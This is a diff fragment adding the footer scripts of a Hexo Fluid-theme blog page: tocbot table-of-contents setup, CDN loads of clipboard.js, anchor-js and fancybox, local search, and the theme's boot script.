+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
